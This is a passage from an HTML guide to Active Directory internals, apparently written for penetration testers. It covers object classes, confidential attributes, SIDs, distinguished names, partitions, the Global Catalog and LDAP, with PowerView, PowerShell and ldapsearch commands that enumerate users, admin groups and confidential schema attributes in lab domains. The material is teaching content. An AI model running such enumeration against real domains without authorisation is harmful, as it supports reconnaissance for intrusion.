On the other hand, the <code class="verbatim">ObjectGUID</code> property is a <a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">GUID</a> (globally unique
identifier) to identify each object of the database. It must not be confused
with the <code class="verbatim">SID</code> (or <code class="verbatim">SecurityIdentifier</code>) property, which is an identifier
related to security principals, such as users or groups.</p>
<p>
Also is important to note that classes can be attached to auxiliary classes in
order to get its properties. This auxiliary classes won't appear in the
<code class="verbatim">ObjectClass</code> property. For example, many of the most relevant classes when
performing a pentest, like User and Group, are attached to <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-securityprincipal">Security-Principal</a>
auxiliary class, the class that defines the <code class="verbatim">SAMAccountName</code> and <code class="verbatim">SID</code> properties. </p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; . .\PowerView.ps1
</span></span><span style="display:flex;"><span>PS C:\&gt; Get-NetComputer dc01 -Properties objectclass | select -ExpandProperty objectclass
</span></span><span style="display:flex;"><span>top
</span></span><span style="display:flex;"><span>person
</span></span><span style="display:flex;"><span>organizationalPerson
</span></span><span style="display:flex;"><span>user
</span></span><span style="display:flex;"><span>computer</span></span></code></pre></div>
</div>
<figcaption>
Classes of computer object
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-properties" class="outline-3">
<h3 id="properties">
Properties
</h3>
<div id="outline-text-properties" class="outline-text-3">
<p>
As we have seen, each class can have several properties or attributes. Usually,
the properties store a string value, like <code class="verbatim">Name</code> or a number like
<code class="verbatim">UserAccountControl</code>.</p>
<p>
Generally, any user of the domain can read the information of any object of the
domain, with a few exceptions. The first exception is the users passwords that
cannot be retrieved.</p>
<p>
The database defines the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f3adda9f-89e1-4340-a3f2-1f0a6249f1f8">UserPassword</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/71e64720-be27-463f-9cc5-117f4bc849e1">UnicodePwd</a>, but these properties
cannot be read, only written. When a <a href="https://docs.microsoft.com/en-US/troubleshoot/windows/win32/change-windows-active-directory-user-password">password change</a> is required, these
properties can be written in order to modify the user password.</p>
<p>
Moreover, there are certain properties that contain sensitive data that should
be only retrieved by authorized users. In order to achieve this, these property
are marked as <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/mark-attribute-as-confidential">confidential properties</a> in the schema (setting the <code class="verbatim">128</code>
flag in
<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-searchflags">SearchFlags</a>
of the property definition)
. Thus, in order to read a
confidential property, apart from the read rights, an user required
<a href="#rights">CONTROL_ACCESS right</a> over that specific property.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">"(searchflags:1.2.840.113556.1.4.803:=128)"</span> -SearchBase <span style="color:#e6db74">"CN=Schema,CN=Configuration,DC=contoso,DC=local"</span> | Select Name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name
</span></span><span style="display:flex;"><span>----
</span></span><span style="display:flex;"><span>ms-TPM-Owner-Information-Temp
</span></span><span style="display:flex;"><span>ms-Kds-KDF-AlgorithmID
</span></span><span style="display:flex;"><span>ms-Kds-KDF-Param
</span></span><span style="display:flex;"><span>ms-Kds-SecretAgreement-AlgorithmID
</span></span><span style="display:flex;"><span>ms-Kds-SecretAgreement-Param
</span></span><span style="display:flex;"><span>ms-Kds-PublicKey-Length
</span></span><span style="display:flex;"><span>ms-Kds-PrivateKey-Length
</span></span><span style="display:flex;"><span>ms-Kds-RootKeyData
</span></span><span style="display:flex;"><span>ms-Kds-Version
</span></span><span style="display:flex;"><span>ms-Kds-DomainID
</span></span><span style="display:flex;"><span>ms-Kds-UseStartTime
</span></span><span style="display:flex;"><span>ms-Kds-CreateTime
</span></span><span style="display:flex;"><span>ms-FVE-RecoveryPassword
</span></span><span style="display:flex;"><span>ms-FVE-KeyPackage
</span></span><span style="display:flex;"><span>ms-TPM-OwnerInformation
</span></span><span style="display:flex;"><span>ms-DS-Transformation-Rules-Compiled
</span></span><span style="display:flex;"><span>ms-PKI-Credential-Roaming-Tokens
</span></span><span style="display:flex;"><span>ms-DS-Issuer-Certificates
</span></span><span style="display:flex;"><span>ms-PKI-RoamingTimeStamp
</span></span><span style="display:flex;"><span>ms-PKI-DPAPIMasterKeys
</span></span><span style="display:flex;"><span>ms-PKI-AccountCredentials
</span></span><span style="display:flex;"><span>UnixUserPassword</span></span></code></pre></div>
</div>
<figcaption>
Get confidential properties
</figcaption>
</figure>
<p>
Additionally, there are certain properties that require to meet certain
conditions before being written. This is controlled with <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/validated-writes">Validated Writes</a>, for
example editing services of an account.</p>
<p>
Furthermore, in order to manage sets of related properties, for given
permissions to an user, is also possible to use <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/property-sets">property sets</a> instead of have to
manage the properties individually.</p>
</div>
</div>
<div id="outline-container-principals" class="outline-3">
<h3 id="principals">
Principals
</h3>
<div id="outline-text-principals" class="outline-text-3">
<p>
One term that you should be familiar with is <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals">principal</a>. In Active Directory, a
<strong>principal is a security entity</strong>. The most common <strong>principals are users, groups
and computers</strong>. This terminology is also used in other areas, like <a href="#kerberos">Kerberos</a>.</p>
<div id="outline-container-sid" class="outline-4">
<h4 id="sid">
SID
</h4>
<div id="outline-text-sid" class="outline-text-4">
<p>
In order to identify principals, each one is assigned a <strong>SID</strong> (Security
Identifier). In Active Directory you can find three kind of SIDs.</p>
<p>
The <strong>Domain SID</strong> is used to identify the domain, as well as the base for SIDs of
the domain principals. </p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $(Get-ADDomain).DomainSID.Value
</span></span><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span></span></span></code></pre></div>
</div>
<figcaption>
Get current domain SID
</figcaption>
</figure>
<p>
The <strong>Principal SID</strong> is used to identify principals. It is compose by the domain
SID and a principal RID (Relative Identifier).</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $(Get-ADUser Anakin).SID.Value
</span></span><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">1103</span></span></span></code></pre></div>
</div>
<figcaption>
SID of user
</figcaption>
</figure>
<p>
In this example you can see that the user SID is the domain SID plus the 1103 RID.</p>
<p>
Finally, in Active Directory there are many <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">Well-known SIDs</a> that identify
abstract entities for special situations. Here are the most common ones:</p>
<ul>
<li>S-1-5-11 -&gt; <strong>Authenticated Users</strong>. The users logged on the system belongs to
this group.</li>
<li>S-1-5-10 -&gt; <strong>Principal Self</strong>. Used in <a href="#security-descriptor">security descriptors</a> to reference the
object itself.</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; . .\PowerView.ps1
</span></span><span style="display:flex;"><span>PS C:\&gt; $(Get-DomainObjectAcl Anakin)[<span style="color:#ae81ff">41</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ObjectDN               <span style="color:#960050;background-color:#1e0010">:</span> CN=Anakin,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>ObjectSID              <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">1103</span>
</span></span><span style="display:flex;"><span>ActiveDirectoryRights  <span style="color:#960050;background-color:#1e0010">:</span> WriteProperty
</span></span><span style="display:flex;"><span>ObjectAceFlags         <span style="color:#960050;background-color:#1e0010">:</span> ObjectAceTypePresent, InheritedObjectAceTypePresent
</span></span><span style="display:flex;"><span>ObjectAceType          <span style="color:#960050;background-color:#1e0010">:</span> ea1b7b93-<span style="color:#ae81ff">5e48</span>-46d5-bc6c-4df4fda78a35
</span></span><span style="display:flex;"><span>InheritedObjectAceType <span style="color:#960050;background-color:#1e0010">:</span> bf967a86-0de6-11d0-a285-00aa003049e2
</span></span><span style="display:flex;"><span>BinaryLength           <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">56</span>
</span></span><span style="display:flex;"><span>AceQualifier           <span style="color:#960050;background-color:#1e0010">:</span> AccessAllowed
</span></span><span style="display:flex;"><span>IsCallback             <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>OpaqueLength           <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>AccessMask             <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>SecurityIdentifier     <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>AceType                <span style="color:#960050;background-color:#1e0010">:</span> AccessAllowedObject
</span></span><span style="display:flex;"><span>AceFlags               <span style="color:#960050;background-color:#1e0010">:</span> ContainerInherit, InheritOnly, Inherited
</span></span><span style="display:flex;"><span>IsInherited            <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>InheritanceFlags       <span style="color:#960050;background-color:#1e0010">:</span> ContainerInherit
</span></span><span style="display:flex;"><span>PropagationFlags       <span style="color:#960050;background-color:#1e0010">:</span> InheritOnly
</span></span><span style="display:flex;"><span>AuditFlags             <span style="color:#960050;background-color:#1e0010">:</span> None</span></span></code></pre></div>
</div>
<figcaption>
Self SID (S-1-5-10) in user security descriptor
</figcaption>
</figure>
<p>
There are also some Well-know SIDs that defines the schema for built-in
principals of the domain/forest. For example:</p>
<ul>
<li><strong>Administrator</strong> -&gt; S-1-5-21-domain-500</li>
<li><strong>Domain Admins</strong> -&gt; S-1-5-21-domain-512</li>
<li><strong>Domain Users</strong> -&gt; S-1-5-21-domain-513</li>
<li><strong>Enterprise Admins</strong> -&gt; S-1-5-21-root domain-519</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $(Get-ADUser Administrator).SID.Value
</span></span><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">500</span></span></span></code></pre></div>
</div>
<figcaption>
Administrator SID
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-distinguished-names" class="outline-3">
<h3 id="distinguished-names">
Distinguished Names
</h3>
<div id="outline-text-distinguished-names" class="outline-text-3">
<p>
It is also important to understand the <code class="verbatim">DistinguishedName</code> property. The
<code class="verbatim">DistinguishedName</code> is like a path that indicates the object position in the
database hierarchy (similar to a file path). </p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADComputer dc01 | select -ExpandProperty DistinguishedName
</span></span><span style="display:flex;"><span>CN=DC01,OU=Domain Controllers,DC=contoso,DC=local</span></span></code></pre></div>
</div>
<figcaption>
DistinguishedName of object
</figcaption>
</figure>
<p>
It is frequently used to identify objects in the database and to reference
another objects in the database. For example, the members of a group are
referenced by its <code class="verbatim">DistinguishedName</code>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADGroup <span style="color:#e6db74">"Domain Admins"</span> -Properties member | select -ExpandProperty Member
</span></span><span style="display:flex;"><span>CN=leia,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>CN=Administrator,CN=Users,DC=contoso,DC=local</span></span></code></pre></div>
</div>
<figcaption>
List members of a group
</figcaption>
</figure>
<p>
The <a href="https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7">Distinguished Name</a> (DN) is compose by several parts that can be:</p>
<dl>
<dt>
Domain Component (DC)
</dt>
<dd>
It usually identifies the domain parts of the database. For example, for
<code class="verbatim">it.domain.com</code> the DC part will be <code class="verbatim">DC=it,DC=domain,DC=com</code>.</dd>
<dt>
<a href="https://en.wikipedia.org/wiki/Active_Directory#Organizational_units">Organizational Unit</a> (OU)
</dt>
<dd>
<p>
Identify containers that are used to group several related objects. It is
worth to note that, even if OUs are similar to groups, its purpose is
different. The OUs purpose is to organize objects in the database, whereas
security groups are used to organize permissions in the domain/forest.</p>
<blockquote>
<p>Sometimes, organizations maps the OUs directly to security groups in a
automated way. These groups are known as <a href="https://en.wikipedia.org/wiki/Active_Directory#Shadow_groups">shadow groups</a>.</p>
</blockquote>
<p>
Organize objects in OUs is useful since you can apply the a <a href="#group-policy">GPO</a> to the OU that
affect to all its objects. This is not possible for members of a group.</p>
</dd>
<dt>
Common Name (CN)
</dt>
<dd>
The name that identifies the object. Sometimes you will see more than one CN
on a path, because some objects also acts as containers. For example, in
<code class="verbatim">CN=Administrator,CN=Users,DC=contoso,DC=local</code>, the <code class="verbatim">CN=Users</code> identifies the
Users container.</dd>
</dl>
</div>
</div>
<div id="outline-container-partitions" class="outline-3">
<h3 id="partitions">
Partitions
</h3>
<div id="outline-text-partitions" class="outline-text-3">
<p>
Apart from OUs and containers, the database is also divided by partitions. Each
database has the following partitions:</p>
<ul>
<li><strong>Domain</strong>: Stores the domain objects.</li>
<li><strong>Configuration</strong>: Stores configuration of the domain, such as the
<code class="verbatim">HOST</code> service alias or <code class="verbatim">Well-known</code> SIDs that we have seen before.</li>
<li><strong>Schema</strong>: Stores the definition of the classes and properties used
by the database.</li>
<li><strong>Domain DNS Zones</strong>: Stores the DNS records of the domain and subdomains.</li>
<li><strong>Forest DNS Zones</strong>: Stores the DNS records of the rest of the forest,
including parent domains.</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Import-Module ActiveDirectory
</span></span><span style="display:flex;"><span>PS C:\&gt; cd AD<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>PS AD<span style="color:#960050;background-color:#1e0010">:</span>\&gt; ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name                 ObjectClass          DistinguishedName
</span></span><span style="display:flex;"><span>----                 -----------          -----------------
</span></span><span style="display:flex;"><span>contoso              domainDNS            DC=contoso,DC=local
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Configuration</span>        configuration        CN=Configuration,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>Schema               dMD                  CN=Schema,CN=Configuration,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>DomainDnsZones       domainDNS            DC=DomainDnsZones,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>ForestDnsZones       domainDNS            DC=ForestDnsZones,DC=contoso,DC=local</span></span></code></pre></div>
</div>
<figcaption>
List database partitions
</figcaption>
</figure>
<blockquote>
<p>You need to load the ActiveDirectory Powershell module in order to access to the
<code class="verbatim">AD:</code> drive with Powershell.</p>
</blockquote>
<p>
Usually you will only use the domain partition, but is important to know how the
database is organized in case you require other data that is not in the domain
partition.</p>
<p>
A tool will search in the domain partition, so if you are searching objects
that are in order partition, you will to specify the partition
<code class="verbatim">DistinguishedName</code> as search base.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADObject -LDAPFilter <span style="color:#e6db74">"(objectclass=site)"</span> -SearchBase <span style="color:#e6db74">"CN=Configuration,</span>$((Get-ADDomain).DistinguishedName)<span style="color:#e6db74">"</span> | select name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>name
</span></span><span style="display:flex;"><span>----
</span></span><span style="display:flex;"><span>Default-First-Site-Name
</span></span><span style="display:flex;"><span>mysite</span></span></code></pre></div>
</div>
<figcaption>
Search sites in configuration partition
</figcaption>
</figure>
<p>
For example, tools like <a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> or <a href="https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1">dns-dump</a> use the DNS Zones partitions in
order to retrieve all the DNS information of the domain.</p>
</div>
</div>
<div id="outline-container-global-catalog" class="outline-3">
<h3 id="global-catalog">
Global Catalog
</h3>
<div id="outline-text-global-catalog" class="outline-text-3">
<p>
The domain database contains all the objects of the current domain, but in order
to speed searches for objects in other domains of the forest, some Domain
Controllers also contains a subset of objects of other domains.</p>
<p>
These Domains Controllers can be called <a href="https://docs.microsoft.com/pt-pt/previous-versions/windows/server/cc737410(v=ws.10)#domain-controller-and-global-catalog-server-structure">Global Catalogs</a> and contains extra
read-only partitions with objects of other domains, for which only a subset of
properties are stored, usually the most used ones. For example, if you need only
to consult the name of an user in other domain, then the global catalog will
allow you to retrieve it without requiring to query the other domain Domain
Controller.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADForest |select -ExpandProperty GlobalCatalogs
</span></span><span style="display:flex;"><span>dc01.poke.mon
</span></span><span style="display:flex;"><span>itdc01.it.poke.mon</span></span></code></pre></div>
</div>
<figcaption>
List the Global Catalogs of the domain.
</figcaption>
</figure>
<p>
In case you want to consult the Global Catalog, you need to an specify a
different port for the connection since the global catalog service listen in the
port 3268 (LDAP).</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-ADUser -Server <span style="color:#e6db74">"poke.mon:3268"</span> -Filter * | select DistinguishedName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>CN=Administrator,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=Guest,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=krbtgt,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=CONTOSO$,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=pikachu,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=ITPOKEMON$,CN=Users,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=Administrator,CN=Users,DC=it,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=Guest,CN=Users,DC=it,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=krbtgt,CN=Users,DC=it,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=POKEMON$,CN=Users,DC=it,DC=poke,DC=mon
</span></span><span style="display:flex;"><span>CN=porygon,CN=Users,DC=it,DC=poke,DC=mon</span></span></code></pre></div>
</div>
<figcaption>
Searching in the global catalog
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-how-to-query-the-database" class="outline-3">
<h3 id="how-to-query-the-database">
How to query the database?
</h3>
<div id="outline-text-how-to-query-the-database" class="outline-text-3">
<p>
In order to interact with the database data, the Domain Controllers gives you
several options that are translate in different protocols/services they
support.</p>
<div id="outline-container-ldap" class="outline-4">
<h4 id="ldap">
LDAP
</h4>
<div id="outline-text-ldap" class="outline-text-4">
<p>
Probably, the first one that should be mentioned is <a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol">LDAP</a> (Lightweight Directory
Access Protocol) protocol. With LDAP is possible to access to the domain
database as well as the <a href="#global-catalog">Global Catalog</a>.</p>
<figure>
<pre class="example">                      .-------------
                      |
                    .---
           .--TCP--&gt;| 389 LDAP
           |        '---
           |          |
           |        .---
           |--SSL--&gt;| 636 LDAPS
 .------.  |        '---
 | LDAP |--|          |
 '------'  |        .---
           |--TCP--&gt;| 3268 LDAP Global Catalog
           |        '---
           |          |
           |        .---
           '--SSL--&gt;| 3269 LDAPS Global Catalog 
                    '---
                      |
                      '-------------
</pre>
<figcaption>
LDAP ports
</figcaption>
</figure>
<p>
LDAP defines a query syntax that allows you to filter the objects that you want
retrieve/edit of the database. You can filter objects based on its properties.
For example, to retrieve the groups of the domain with members you can use the
following query <code class="verbatim">(&amp;(objectsclass=group)(members=*))</code>.</p>
<p>
Apart from filters, LDAP also allows you to specify the properties you would
like to retrieve for each object, for example the name. Be sure to check the
<a href="https://ldapwiki.com/">LDAP wiki</a> if you need examples of retrieving information from Active Directory.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~$ ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D <span style="color:#e6db74">"anakin@contoso.local"</span> -b <span style="color:#e6db74">"dc=contoso,dc=local"</span> <span style="color:#e6db74">"(&amp;(objectclass=group)(member=*))"</span> <span style="color:#e6db74">"samaccountname"</span>
</span></span><span style="display:flex;"><span>Enter LDAP Password: 
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Administrators,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Users,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Users
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Guests,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Guests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Remote Desktop Users,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Remote Desktop Users
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>IIS_IUSRS,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: IIS_IUSRS
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Schema Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Schema Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Enterprise Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Enterprise Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Domain Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Domain Admins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Group Policy Creator Owners
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Pre-Windows <span style="color:#ae81ff">2000</span> Compatible Access,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Pre-Windows <span style="color:#ae81ff">2000</span> Compatible Access
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Windows Authorization Access Group,CN<span style="color:#f92672">=</span>Builtin,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Windows Authorization Access Group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Denied RODC Password Replication Group,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>contoso,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>sAMAccountName: Denied RODC Password Replication Group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># refldap://ForestDnsZones.contoso.local/DC=ForestDnsZones,DC=contoso,DC=local</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># refldap://DomainDnsZones.contoso.local/DC=DomainDnsZones,DC=contoso,DC=local</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># refldap://contoso.local/CN=Configuration,DC=contoso,DC=local</span></span></span></code></pre></div>
</div>
<figcaption>
Domain groups with members
</figcaption>
</figure>
<p>
Almost any object and property of the Active Directory database can be retrieved
by using LDAP. The exception are those attributes that are highly sensitive,
such as users credentials.</p>
<p>
LDAP is used by many Windows tools like <a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a> or <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a>. In case you
don't have tools, you can always use <a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices?view=net-5.0\]\[.NET objects related to LDAP\]\] to make LDAP queries, youcan check DomainSearcher as example">Powershell to query LDAP</a> by using .NET.</p>
<p>
On the other hand, from Linux, you can use <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a> and <a href="https://linux.die.net/man/1/ldapmodify">ldapmodify</a> tools. </p>
<p>
When you need to retrieve information from the Active Directory, like
enumerating users or something like that, LDAP should the first thing to come to
your mind. But remember that LDAP also allows you to modify objects, so if you
need to add an user to a group or stuff like that, well.. this is a way.</p>
</div>
</div>
<div id="outline-container-adws" class="outline-4">
<h4 id="adws">
ADWS
</h4>
<div id="outline-text-adws" class="outline-text-4">
<p>
As alternative to LDAP, <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd391908(v=ws.10)?redirectedfrom=MSDN">in Windows Server 2008 R2</a>, Microsoft introduced ADWS
(Active Directory Web Services), a protocol to query and manipulate domain
objects based on <a href="https://en.wikipedia.org/wiki/SOAP">SOAP</a> messages.</p>
<p>
It is <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsds/2ded136c-2fe2-4f7d-8d09-a7118815c6bb">compatible with LDAP filters</a> so it is possible to perform very specific
queries and retrieve only the required properties. In fact, when ADWS is used,
internally the DC perform LDAP requests to retrieve the results.</p>
<figure>
